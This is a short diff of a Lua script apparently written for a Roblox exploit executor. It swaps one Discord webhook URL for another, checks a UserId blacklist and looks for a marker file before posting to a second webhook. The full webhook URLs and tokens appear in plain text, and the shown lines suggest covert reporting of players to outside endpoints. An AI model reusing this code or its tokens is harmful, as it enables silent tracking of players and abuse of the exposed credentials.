@@ -44,7 +44,7 @@ local Blacklisted = {
 }
 
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1089255298449014914/85lo9hAXU_KRiIOY3wKGQDODkqyOV7K54VY7tUKLQLYkfmf-yS98Dgv96VgItDhOjLG8"
+local Webhook_URL = "https://discord.com/api/webhooks/1089255618038206565/00PUlfWNICjmLOUW-kOab_zogqlpGy8lOoXlQe1FCRbkJXFwydAlHOPCUblRyo-w5WoX"
 
 local response = syn.request({
     Url = Webhook_URL,
@@ -83,7 +83,6 @@ if table.find(Blacklisted, game:GetService("Players").LocalPlayer.UserId) then
 end
 
 if isfile("123712091724.lua") then
-local HttpService = game:GetService("HttpService")
 local BlacklistWebhook_URL = "https://discord.com/api/webhooks/1089252885277179994/JBEflHf1Lnma_528KvvVnSiVI6ghSnKyRM9ZDC9HS8iFjcDP1qke9OGeRcaduEu4c03I"
     local response_blacklist = syn.request({
         Url = BlacklistWebhook_URL,
